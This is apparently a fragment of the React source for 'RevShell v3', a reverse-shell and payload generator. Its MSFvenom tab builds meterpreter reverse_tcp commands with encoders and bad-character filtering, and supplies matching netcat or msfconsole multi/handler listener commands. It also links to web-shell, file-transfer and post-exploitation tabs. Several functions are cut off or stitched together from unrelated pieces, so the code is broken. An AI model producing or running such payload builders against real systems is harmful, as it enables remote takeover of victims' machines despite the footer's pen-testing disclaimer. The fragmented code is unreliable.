function useLS(key,def){
  const[v,setV]=useState(()=>{try{const s=localStorage.getItem(key);return s!==null?JSON.parse(s):def;}catch{return def;}});
  useEffect(()=>{try{localStorage.setItem(key,JSON.stringify(v));}catch{}},[key,v]);
  return[v,setV];
}

function CopyBtn({text,small,label,onCopy}){
  const[ok,setOk]=useState(false);
  const go=e=>{
    e.stopPropagation();
    const copy=()=>{setOk(true);setTimeout(()=>setOk(false),1800);if(window.__toast)window.__toast("Copied!");if(onCopy)onCopy(text);};
    navigator.clipboard?.writeText(text).then(copy).catch(()=>{const t=document.createElement("textarea");t.value=text;document.body.appendChild(t);t.select();document.execCommand("copy");document.body.removeChild(t);copy();});
  };

/* ══════════════════════════════════════════════════════
   DIFF VIEWER MODAL
══════════════════════════════════════════════════════ */
function DiffModal({onClose}){
  const[a,setA]=useState("");const[b,setB]=useState("");
  const diff=useMemo(()=>{
    if(!a||!b)return null;
    const maxLen=Math.max(a.length,b.length);
    const result=[];let i=0;
    while(i<maxLen){
      const ca=a[i]||"";const cb=b[i]||"";
      if(ca===cb){let run=ca;let j=i+1;while(j<maxLen&&(a[j]||"")===(b[j]||"")){run+=(a[j]||"");j++;}result.push({type:"same",text:run});i=j;}
      else{result.push({type:"diff",textA:ca,textB:cb});i++;}
    }
    return result;
  },[a,b]);
  const same=diff?diff.filter(d=>d.type==="same").reduce((n,d)=>n+d.text.length,0):0;
  const pct=a.length?Math.round(same/Math.max(a.length,b.length)*100):0;
  return <div style={{position:"fixed",inset:0,background:"rgba(0,0,0,0.78)",zIndex:700,display:"flex",alignItems:"center",justifyContent:"center",backdropFilter:"blur(4px)"}} onClick={onClose}>
    <div onClick={e=>e.stopPropagation()} style={{background:"#080e08",border:"1px solid rgba(0,255,170,0.2)",borderRadius:14,padding:"24px",width:700,maxWidth:"97vw",maxHeight:"88vh",overflowY:"auto"}}>
      <div style={{display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:16}}>
        <div><div style={{color:"#cce8cc",fontSize:14,fontWeight:700,fontFamily:"monospace"}}>⚡ Payload Diff Viewer</div><div style={{color:"#2a4a2a",fontSize:11,marginTop:2}}>Compare two payloads character by character</div></div>
        <button onClick={onClose} style={{background:"none",border:"none",color:"#2a4a2a",cursor:"pointer",fontSize:20}}>×</button>
      </div>
      <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:12,marginBottom:14}}>
        {[["Payload A",a,setA],[" Payload B",b,setB]].map(([label,val,setter])=><div key={label}>
          <div style={{color:"#2a4a2a",fontSize:9,fontFamily:"monospace",letterSpacing:2,marginBottom:5}}>{label}</div>
          <textarea value={val} onChange={e=>setter(e.target.value)} placeholder="Paste payload here…" rows={5} style={{...IS,width:"100%",boxSizing:"border-box",resize:"vertical",lineHeight:1.6}}/>
        </div>)}
      </div>
      {diff&&<>
        <div style={{display:"flex",gap:12,marginBottom:10,fontSize:11,fontFamily:"monospace"}}>
          <span style={{color:"#00ffaa"}}>● Same: {same} chars ({pct}%)</span>
          <span style={{color:"#ff4444"}}>● Different: {Math.max(a.length,b.length)-same} chars</span>
        </div>
        <div style={{background:"#040a04",border:"1px solid #0d2a0d",borderRadius:8,padding:"12px",fontFamily:"'Fira Code',monospace",fontSize:11,lineHeight:1.7,wordBreak:"break-all"}}>
          {diff.map((d,i)=>d.type==="same"?<span key={i} style={{color:"#4a7a4a"}}>{d.text}</span>:<span key={i}><span style={{background:"rgba(255,68,68,0.3)",color:"#ff8888",borderRadius:2}}>{d.textA||"∅"}</span></span>)}
        </div>
        <div style={{marginTop:8,fontSize:9,color:"#1e3a1e",fontFamily:"monospace"}}>Highlighted chars = positions where payload A differs from B. ∅ = character only in the longer payload.</div>
      </>}
    </div>
  </div>;
}

  const[showOnboard,setShowOnboard]=useLS("rvs2_onboard",true);const[showImport,setShowImport]=useState(false);
  const searchRef=useRef(null);
  useEffect(()=>{
    const h=e=>{
      if(e.key==="/"&&document.activeElement.tagName!=="INPUT"&&document.activeElement.tagName!=="TEXTAREA"){e.preventDefault();searchRef.current?.focus();}
      if(e.key==="Escape")setExpanded(null);

  },[]);
  const counts=useMemo(()=>{const c={};allShells.forEach(s=>{c[s.cat]=(c[s.cat]||0)+1;});return c;},[allShells]);
  const filtered=useMemo(()=>{

      if(cat==="starred")return favorites.includes(s.id);
      if(cat!=="all"&&s.cat!==cat)return false;
      if(osf!=="all"&&!s.os?.includes(osf))return false;
      if(s.stealth&&s.stealth<stealth)return false;
      if(q)return s.name.toLowerCase().includes(q)||s.info.toLowerCase().includes(q)||s.tags.some(t=>t.includes(q))||s.cat.includes(q);
      return true;
    });
  },[cat,osf,stealth,search,favorites,allShells]);

      </button>
      {CATS.map(c=><button key={c.id} onClick={()=>setCat(c.id)} style={{width:"100%",textAlign:"left",background:"none",border:"none",borderLeft:`2px solid ${cat===c.id?"#00ffaa":"transparent"}`,padding:"7px 13px",color:cat===c.id?"#00ffaa":"#2a4a2a",cursor:"pointer",fontSize:12,fontFamily:"monospace",display:"flex",alignItems:"center",justifyContent:"space-between"}}>
        <span><span style={{marginRight:6,opacity:.6}}>{c.icon}</span>{c.label}</span>
        {c.id!=="all"&&counts[c.id]&&<span style={{fontSize:9,color:"#162a16",background:"rgba(255,255,255,0.03)",padding:"1px 5px",borderRadius:3}}>{counts[c.id]}</span>}
      </button>)}
      <div style={{padding:"14px 13px 5px",color:"#162a16",fontSize:9,letterSpacing:2,marginTop:4}}>OS TARGET</div>

        <span style={{fontSize:9,color:osf===o.id?"#00ffaa":"#162a16"}}>{osf===o.id?"◉":"○"}</span>{o.label}
      </button>)}
      <div style={{padding:"14px 13px 4px",color:"#162a16",fontSize:9,letterSpacing:2}}>MIN STEALTH</div>

                    })}
                  </div>
                  {step.tip&&<div style={{background:"rgba(0,255,170,0.03)",border:"1px solid rgba(0,255,170,0.1)",borderRadius:7,padding:"9px 12px",display:"flex",gap:8}}>
                    <span style={{color:"#00ffaa",fontSize:12,flexShrink:0}}>💡</span>
                    <span style={{fontSize:11,color:"#3a6a3a",lineHeight:1.5}}>{step.tip}</span>
                  </div>}
                </div>
              )}
            </div>
          );
        })}
      </div>
    </div>
  );
}

/* ══════════════════════════════════════════════════════
   MSFVENOM TAB
══════════════════════════════════════════════════════ */
function MsfvenomTab({ip,port}){
  const[os,setOs]=useState("windows");
  const[pay,setPay]=useState("windows/x64/meterpreter/reverse_tcp");
  const[fmt,setFmt]=useState("exe");
  const[enc,setEnc]=useState("none");
  const[iter,setIter]=useState("1");
  const[out,setOut]=useState("shell");
  const[bad,setBad]=useState("\\x00");
  const[showSSL,setShowSSL]=useState(false);

  useEffect(()=>{
    const firstId=MSF_PAYLOADS[os]?.[0]?.id||"";
    const firstFmt=MSF_FORMATS[os]?.[0]?.id||"raw";
    setPay(firstId);
    setFmt(firstFmt);
  },[os]);

  const payObj=useMemo(
    ()=>MSF_PAYLOADS[os]?.find(p=>p.id===pay)||MSF_PAYLOADS[os]?.[0],
    [os,pay]
  );
  const fmtObj=useMemo(
    ()=>MSF_FORMATS[os]?.find(f=>f.id===fmt)||MSF_FORMATS[os]?.[0],
    [os,fmt]
  );

  const cmd=useMemo(()=>{
    const parts=[
      "msfvenom",
      `-p ${pay}`,
      `LHOST=${ip||"10.10.10.10"}`,
      `LPORT=${port||"4444"}`
    ];
    if(bad)parts.push(`-b "${bad}"`);
    if(enc!=="none")parts.push(`-e ${enc}`,`-i ${iter||"1"}`);
    parts.push(`-f ${fmt}`,`-o ${out||"shell"}${fmtObj?.ext||""}`);
    return parts.join(" \\\n  ");
  },[pay,ip,port,bad,enc,iter,fmt,out,fmtObj]);

  const listenerCmd=useMemo(()=>{
    const isMeter=pay.includes("meterpreter");
    const isHttps=pay.includes("https");
    if(!isMeter)return `nc -lvnp ${port||"4444"}`;
    return `msfconsole -q -x "use multi/handler; set PAYLOAD ${pay}; set LHOST ${ip||"10.10.10.10"}; set LPORT ${port||"4444"}; ${isHttps?"set HANDLERSSLCERT cert.pem; ":""}exploit"`;
  },[pay,ip,port]);

  const isHttps=pay.includes("https");

  return (
    <div style={{padding:"20px 22px",maxWidth:920}}>
      <h2 style={{color:"#cce8cc",fontSize:16,fontWeight:700,margin:"0 0 4px",fontFamily:"monospace",letterSpacing:1}}>
        ⚔ MSFvenom Payload Builder
      </h2>
      <p style={{color:"#2a4a2a",fontSize:11,margin:"0 0 18px",lineHeight:1.6}}>
        Build msfvenom commands for staged and stageless payloads. LHOST/LPORT sync from the header.
      </p>

      {isHttps&&(
        <div style={{background:"rgba(0,170,255,0.04)",border:"1px solid rgba(0,170,255,0.15)",borderRadius:8,padding:"10px 14px",marginBottom:16,display:"flex",justifyContent:"space-between",alignItems:"center"}}>
          <span style={{color:"#0088cc",fontSize:11}}>
            🔒 HTTPS payload — you need an SSL certificate.
          </span>
          <button
            onClick={()=>setShowSSL(v=>!v)}
            style={{background:"rgba(0,170,255,0.1)",border:"1px solid rgba(0,170,255,0.25)",borderRadius:6,color:"#00aaff",padding:"4px 10px",fontSize:10,cursor:"pointer",fontFamily:"monospace"}}
          >
            {showSSL?"Hide SSL Guide":"Show SSL Guide"}
          </button>
        </div>
      )}

      {showSSL&&<SSLPanel ip={ip}/>}

      <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:18,marginBottom:16}}>
        <div style={{display:"flex",flexDirection:"column",gap:14}}>
          <div>
            <SL>TARGET OS</SL>
            <div style={{display:"flex",gap:6,flexWrap:"wrap"}}>
              {Object.keys(MSF_PAYLOADS).map(o=>(
                <SelBtn
                  key={o}
                  label={{linux:"🐧 Linux",windows:"⊞ Windows",macos:"⌘ macOS",web:"🌐 Web"}[o]}
                  active={os===o}
                  onClick={()=>setOs(o)}
                />
              ))}
            </div>
          </div>

          <div>
            <SL>PAYLOAD</SL>
            <select
              value={pay}
              onChange={e=>setPay(e.target.value)}
              style={{...IS,width:"100%",appearance:"none"}}
            >
              {MSF_PAYLOADS[os]?.map(p=>(
                <option key={p.id} value={p.id}>{p.label}</option>
              ))}
            </select>
            {payObj&&(
              <div style={{marginTop:5,display:"flex",gap:6}}>
                <span style={{fontSize:9,color:"#2a5a2a",background:"rgba(255,255,255,0.03)",border:"1px solid #1a2a1a",borderRadius:3,padding:"2px 6px",fontFamily:"monospace"}}>
                  {payObj.arch}
                </span>
                <span style={{fontSize:9,color:payObj.staged?"#ffd700":"#88ff00",background:"rgba(255,255,255,0.03)",border:"1px solid #1a2a1a",borderRadius:3,padding:"2px 6px",fontFamily:"monospace"}}>
                  {payObj.staged?"staged — needs multi/handler":"stageless — nc works"}
                </span>
              </div>
            )}
          </div>

          <div>
            <SL>OUTPUT FORMAT</SL>
            <select
              value={fmt}
              onChange={e=>setFmt(e.target.value)}
              style={{...IS,width:"100%",appearance:"none"}}
            >
              {MSF_FORMATS[os]?.map(f=>(
                <option key={f.id} value={f.id}>{f.label}</option>
              ))}
            </select>
            {fmtObj&&(
              <p style={{fontSize:10,color:"#2a4a2a",margin:"4px 0 0"}}>
                {fmtObj.note}
              </p>
            )}
          </div>
        </div>

        <div style={{display:"flex",flexDirection:"column",gap:14}}>
          <div>
            <SL>ENCODER</SL>
            <select
              value={enc}
              onChange={e=>setEnc(e.target.value)}
              style={{...IS,width:"100%",appearance:"none"}}
            >
              {MSF_ENCODERS.map(e=>(
                <option key={e.id} value={e.id}>{e.label}</option>
              ))}
            </select>
            {enc!=="none"&&(
              <p style={{fontSize:10,color:"#554400",margin:"4px 0 0"}}>
                ⚠ Encoding ≠ encryption. Modern EDR bypasses it easily.
              </p>
            )}
          </div>

          <div>
            <SL>ITERATIONS {enc==="none"&&"(encoder off)"}</SL>
            <input
              value={iter}
              onChange={e=>setIter(e.target.value)}
              disabled={enc==="none"}
              style={{...IS,width:"100%",opacity:enc==="none"?0.4:1}}
              placeholder="1"
            />
            <p style={{fontSize:10,color:"#2a4a2a",margin:"4px 0 0"}}>
              3–5 iterations are typical; higher values grow the payload.
            </p>
          </div>

          <div>
            <SL>OUTPUT FILENAME</SL>
            <input
              value={out}
              onChange={e=>setOut(e.target.value)}
              style={{...IS,width:"100%"}}
              placeholder="shell"
            />
            <p style={{fontSize:10,color:"#2a4a2a",margin:"4px 0 0"}}>
              Final name: {(out||"shell")}{fmtObj?.ext||""}
            </p>
          </div>

          <div>
            <SL>BAD CHARACTERS</SL>
            <input
              value={bad}
              onChange={e=>setBad(e.target.value)}
              style={{...IS,width:"100%"}}
              placeholder="\\x00"
            />
            <p style={{fontSize:10,color:"#2a4a2a",margin:"4px 0 0"}}>
              Leave blank for none. Common: \x00 \x0a \x0d.
            </p>
          </div>
        </div>
      </div>

      <div style={{display:"grid",gridTemplateColumns:"1.4fr 1fr",gap:14}}>
        <div>
          <SL>MSFVENOM COMMAND</SL>
          <div style={{display:"flex",gap:8,alignItems:"flex-start"}}>
            <pre style={{flex:1,margin:0,background:"#040a04",border:"1px solid #0d1a0d",borderRadius:6,padding:"8px 10px",color:"#00ffaa",fontFamily:"'Fira Code',monospace",fontSize:11,whiteSpace:"pre-wrap",wordBreak:"break-all",lineHeight:1.7}}>
{cmd}
            </pre>
            <CopyBtn text={cmd}/>
          </div>
        </div>
        <div>
          <SL>RECOMMENDED LISTENER</SL>
          <div style={{display:"flex",gap:8,alignItems:"flex-start"}}>
            <pre style={{flex:1,margin:0,background:"#040a04",border:"1px solid #0d1a0d",borderRadius:6,padding:"8px 10px",color:"#88cc88",fontFamily:"'Fira Code',monospace",fontSize:11,whiteSpace:"pre-wrap",wordBreak:"break-word",lineHeight:1.7}}>
{listenerCmd}
            </pre>
            <CopyBtn text={listenerCmd}/>
          </div>
        </div>
      </div>
    </div>
  );
}

/* ══════════════════════════════════════════════════════
   ROOT APP
══════════════════════════════════════════════════════ */
function App(){
  const[ip,setIp]=useLS("rvs3_ip","10.10.10.10");
  const[port,setPort]=useLS("rvs3_port","4444");
  const[tab,setTab]=useState("shells");
  const[cursor,setCursor]=useState(true);
  const[showFlow,setShowFlow]=useState(false);
  const[showAI,setShowAI]=useState(false);
  const[showKeys,setShowKeys]=useState(false);
  const[showHistory,setShowHistory]=useState(false);
  const[showDiff,setShowDiff]=useState(false);
  const[favorites,setFavorites]=useLS("rvs3_favs",[]);
  const[customShells,setCustomShells]=useLS("rvs3_custom_shells",[]);
  const[history,setHistory]=useLS("rvs3_history",[]);
  const[toast,setToast]=useState({visible:false,msg:""});

  useEffect(()=>{
    window.__toast=(msg)=>{
      setToast({visible:true,msg});
      setTimeout(()=>setToast(t=>({...t,visible:false})),2200);
    };
  },[]);

  useEffect(()=>{
    const t=setInterval(()=>setCursor(v=>!v),550);
    return()=>clearInterval(t);
  },[]);

  useEffect(()=>{
    const h=e=>{
      const tag=(document.activeElement&&document.activeElement.tagName)||"";
      if(tag==="INPUT"||tag==="TEXTAREA")return;
      if(e.key==="?")setShowKeys(true);
      if(e.key==="1")setTab("shells");
      if(e.key==="2")setTab("msf");
      if(e.key==="3")setTab("webshell");
      if(e.key==="4")setTab("filetx");
      if(e.key==="5")setTab("postex");
      if(e.key==="H"||e.key==="h")setShowHistory(v=>!v);
      if(e.key==="D"||e.key==="d")setShowDiff(true);
      if(e.key==="P"||e.key==="p")window.print();
    };
    window.addEventListener("keydown",h);
    return()=>window.removeEventListener("keydown",h);
  },[]);

  const toggleFav=useCallback(
    id=>setFavorites(prev=>prev.includes(id)?prev.filter(x=>x!==id):[...prev,id]),
    [setFavorites]
  );

  const addHistory=useCallback(
    item=>setHistory(prev=>{
      const next=[...prev,item];
      return next.slice(-20);
    }),
    [setHistory]
  );

  const addCustomShell=useCallback(
    shell=>setCustomShells(prev=>[...prev,shell]),
    [setCustomShells]
  );

  const clearHistory=useCallback(
    ()=>setHistory([]),
    [setHistory]
  );

  const ipValid=/^(\d{1,3}\.){3}\d{1,3}$/.test(ip)||/^[a-zA-Z0-9.\-]+$/.test(ip);
  const portValid=/^\d+$/.test(port)&&parseInt(port,10)>0&&parseInt(port,10)<=65535;

  const tabDefs=[
    {id:"shells",icon:"⚡",label:"Reverse Shells",badge:SHELLS_BASE.length+customShells.length},
    {id:"msf",icon:"⚔",label:"MSFvenom",badge:Object.values(MSF_PAYLOADS).flat().length},
    {id:"webshell",icon:"🐚",label:"Web Shells",badge:WEB_SHELLS.length},
    {id:"filetx",icon:"📦",label:"File Transfer",badge:Object.values(FILE_TRANSFER).flat().length},
    {id:"postex",icon:"🎯",label:"Post-Exploitation",badge:null},
  ];

  return (
    <div style={{minHeight:"100vh",background:"#060c06",color:"#b8ccb8",fontFamily:"'Fira Code','Cascadia Code','JetBrains Mono',monospace,sans-serif",display:"flex",flexDirection:"column"}}>
      {/* HEADER */}
      <header style={{position:"sticky",top:0,zIndex:200,background:"rgba(3,6,3,0.97)",backdropFilter:"blur(12px)",borderBottom:"1px solid #0a140a"}}>
        <div style={{height:52,display:"flex",alignItems:"center",padding:"0 16px",gap:8,boxSizing:"border-box",borderBottom:"1px solid #080e08",flexWrap:"nowrap",overflow:"hidden"}}>
          <div style={{display:"flex",alignItems:"center",gap:7,flexShrink:0}}>
            <span style={{width:25,height:25,borderRadius:5,background:"linear-gradient(135deg,#00ffaa14,#00ffaa28)",border:"1px solid rgba(0,255,170,0.3)",display:"flex",alignItems:"center",justifyContent:"center",fontSize:12}}>⚡</span>
            <span style={{fontSize:14,fontWeight:700,color:"#cce8cc",letterSpacing:1}}>RevShell</span>
            <span style={{fontSize:9,color:"#00ffaa",background:"rgba(0,255,170,0.07)",border:"1px solid rgba(0,255,170,0.2)",borderRadius:3,padding:"1px 6px",letterSpacing:2,fontWeight:700}}>v3</span>
          </div>
          <div style={{flex:1}}/>
          <div style={{display:"flex",gap:3,alignItems:"center",flexShrink:0}}>
            <span style={{color:"#162a16",fontSize:9,letterSpacing:1,marginRight:2}}>QUICK:</span>
            {PORT_PRESETS.map(p=>(
              <button
                key={p.p}
                onClick={()=>setPort(p.p)}
                title={p.note}
                style={{background:port===p.p?"rgba(0,255,170,0.1)":"rgba(255,255,255,0.02)",border:`1px solid ${port===p.p?"rgba(0,255,170,0.3)":"#0d1a0d"}`,borderRadius:5,color:port===p.p?"#00ffaa":"#2a4a2a",padding:"3px 6px",fontSize:9,cursor:"pointer",fontFamily:"monospace",transition:"all .15s"}}
              >
                {p.p}
              </button>
            ))}
          </div>
          <div style={{display:"flex",alignItems:"center",gap:5,flexShrink:0}}>
            <span style={{color:"#1e3a1e",fontSize:10,letterSpacing:1,whiteSpace:"nowrap"}}>LHOST</span>
            <div style={{position:"relative"}}>
              <input
                value={ip}
                onChange={e=>setIp(e.target.value)}
                placeholder="10.10.10.10"
                style={{...IS,width:140,borderColor:ip&&!ipValid?"rgba(255,68,68,0.5)":"#1a2a1a"}}
                onFocus={e=>{e.target.style.borderColor="rgba(0,255,170,0.35)";}}
                onBlur={e=>{e.target.style.borderColor=ip&&!ipValid?"rgba(255,68,68,0.5)":"#1a2a1a";}}
              />
              {ip&&!ipValid&&<span style={{position:"absolute",right:-16,top:"50%",transform:"translateY(-50%)",color:"#ff4444",fontSize:10}}>!</span>}
            </div>
            <span style={{color:"#1e3a1e",fontSize:10,letterSpacing:1,whiteSpace:"nowrap"}}>LPORT</span>
            <input
              value={port}
              onChange={e=>setPort(e.target.value)}
              placeholder="4444"
              style={{...IS,width:64,borderColor:port&&!portValid?"rgba(255,68,68,0.5)":"#1a2a1a"}}
              onFocus={e=>{e.target.style.borderColor="rgba(0,255,170,0.35)";}}
              onBlur={e=>{e.target.style.borderColor=port&&!portValid?"rgba(255,68,68,0.5)":"#1a2a1a";}}
            />
            <span style={{color:"#00ffaa",fontSize:11,opacity:.3,width:9,userSelect:"none"}}>
              {cursor?"█":""}
            </span>
          </div>
          <div style={{display:"flex",gap:5,flexShrink:0}}>
            <button onClick={()=>setShowAI(true)} style={{background:"rgba(0,170,255,0.07)",border:"1px solid rgba(0,170,255,0.2)",borderRadius:6,color:"#00aaff",padding:"5px 10px",fontSize:10,cursor:"pointer",fontFamily:"monospace",letterSpacing:1,whiteSpace:"nowrap"}}>🤖 AI</button>
            <button onClick={()=>setShowFlow(true)} style={{background:"rgba(0,255,170,0.06)",border:"1px solid rgba(0,255,170,0.2)",borderRadius:6,color:"#00ffaa",padding:"5px 10px",fontSize:10,cursor:"pointer",fontFamily:"monospace",letterSpacing:1,whiteSpace:"nowrap"}}>⚡ Workflow</button>
            <button onClick={()=>setShowHistory(true)} style={{background:"rgba(255,255,255,0.02)",border:"1px solid #1a2a1a",borderRadius:6,color:"#2a4a2a",padding:"5px 8px",fontSize:10,cursor:"pointer",fontFamily:"monospace"}}>H</button>
            <button onClick={()=>setShowDiff(true)} style={{background:"rgba(255,255,255,0.02)",border:"1px solid #1a2a1a",borderRadius:6,color:"#2a4a2a",padding:"5px 8px",fontSize:10,cursor:"pointer",fontFamily:"monospace"}}>D</button>
            <button onClick={()=>setShowKeys(true)} title="Keyboard shortcuts (?)" style={{background:"rgba(255,255,255,0.02)",border:"1px solid #1a2a1a",borderRadius:6,color:"#2a4a2a",padding:"5px 8px",fontSize:10,cursor:"pointer",fontFamily:"monospace"}}>?</button>
          </div>
        </div>
        <div style={{display:"flex",gap:0,padding:"0 14px",overflowX:"auto"}}>
          {tabDefs.map(t=>(
            <button
              key={t.id}
              onClick={()=>setTab(t.id)}
              style={{background:"none",border:"none",borderBottom:`2px solid ${tab===t.id?"#00ffaa":"transparent"}`,color:tab===t.id?"#00ffaa":"#3a5a3a",padding:"9px 14px",fontSize:11,cursor:"pointer",fontFamily:"monospace",letterSpacing:1,whiteSpace:"nowrap",display:"flex",alignItems:"center",gap:5}}
            >
              <span>{t.icon}</span>
              {t.label}
              {t.badge!=null&&(
                <span style={{fontSize:9,color:tab===t.id?"#00ffaa55":"#1e3a1e",background:"rgba(255,255,255,0.03)",padding:"1px 5px",borderRadius:10}}>
                  {t.badge}
                </span>
              )}
              {t.id==="shells"&&favorites.length>0&&(
                <span style={{fontSize:9,color:"#665500",background:"rgba(255,200,0,0.08)",border:"1px solid rgba(255,200,0,0.15)",padding:"1px 5px",borderRadius:10}}>
                  ⭐{favorites.length}
                </span>
              )}
            </button>
          ))}
        </div>
      </header>

      {/* BODY */}
      <div style={{flex:1,overflow:"hidden",display:"flex",flexDirection:"column",minHeight:0}}>
        {tab==="shells"&&(
          <RevShellsTab
            ip={ip}
            port={port}
            favorites={favorites}
            onToggleFav={toggleFav}
            customShells={customShells}
            onAddCustom={addCustomShell}
            addHistory={addHistory}
          />
        )}
        {tab==="msf"&&(
          <div style={{overflowY:"auto",flex:1}}>
            <MsfvenomTab ip={ip} port={port}/>
          </div>
        )}
        {tab==="webshell"&&(
          <div style={{overflowY:"auto",flex:1}}>
            <WebShellsTab ip={ip} port={port}/>
          </div>
        )}
        {tab==="filetx"&&(
          <div style={{overflowY:"auto",flex:1}}>
            <FileTransferTab ip={ip} port={port}/>
          </div>
        )}
        {tab==="postex"&&(
          <div style={{overflowY:"auto",flex:1}}>
            <PostExTab/>
          </div>
        )}
      </div>

      {/* FOOTER */}
      <footer style={{borderTop:"1px solid #0a140a",padding:"6px 18px",display:"flex",alignItems:"center",justifyContent:"space-between",background:"rgba(2,4,2,0.9)",fontSize:10,color:"#162216",fontFamily:"monospace",flexWrap:"wrap",gap:6}}>
        <span>
          RevShell v3 · Authorized pen-testing &amp; CTF only ·
          <kbd style={{background:"rgba(255,255,255,0.04)",border:"1px solid #1a2a1a",borderRadius:3,padding:"1px 5px",margin:"0 3px"}}>/</kbd>search
          <kbd style={{background:"rgba(255,255,255,0.04)",border:"1px solid #1a2a1a",borderRadius:3,padding:"1px 5px",margin:"0 3px"}}>?</kbd>shortcuts
          <kbd style={{background:"rgba(255,255,255,0.04)",border:"1px solid #1a2a1a",borderRadius:3,padding:"1px 5px",margin:"0 3px"}}>1–5</kbd>tabs
        </span>
        <span>
          ⚡ {SHELLS_BASE.length+customShells.length} shells · {WEB_SHELLS.length} webshells · {Object.values(MSF_PAYLOADS).flat().length} MSF · {Object.values(FILE_TRANSFER).flat().length} transfer methods
        </span>
      </footer>

      {/* MODALS */}
      {showFlow&&<WorkflowPanel ip={ip} port={port} onClose={()=>setShowFlow(false)}/>}
      {showAI&&<AIAdvisorModal ip={ip} port={port} onClose={()=>setShowAI(false)}/>}
      {showKeys&&<ShortcutsModal onClose={()=>setShowKeys(false)}/>}
      {showHistory&&<HistoryPanel history={history} onClear={clearHistory} onClose={()=>setShowHistory(false)}/>}
      {showDiff&&<DiffModal onClose={()=>setShowDiff(false)}/>}

      {/* TOAST */}
      <Toast message={toast.msg} visible={toast.visible}/>
    </div>
  );
}

const root=ReactDOM.createRoot(document.getElementById("root"));
root.render(<App/>);
</script>
</body>
</html>
